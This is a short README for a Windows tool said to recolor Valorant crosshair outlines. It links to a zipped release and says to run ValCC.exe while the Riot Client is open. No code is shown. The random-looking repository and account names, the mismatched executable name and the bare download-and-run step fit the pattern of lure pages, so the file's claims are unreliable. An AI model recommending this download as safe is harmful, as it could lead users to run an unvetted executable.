# ntskhmd

A Windows app that changes the outline color of your Valorant crosshair profiles.

[![Download ntskhmd](https://img.shields.io/badge/Download-ntskhmd.zip-2ea44f?style=for-the-badge&logo=github)](https://github.com/cduqzm/ntskhmd/releases/latest/download/ntskhmd.zip)

## Install

1. Click **Download** above and unzip the file.
2. Start the Riot Client, then run `ValCC.exe` from the unzipped `ntskhmd` folder.
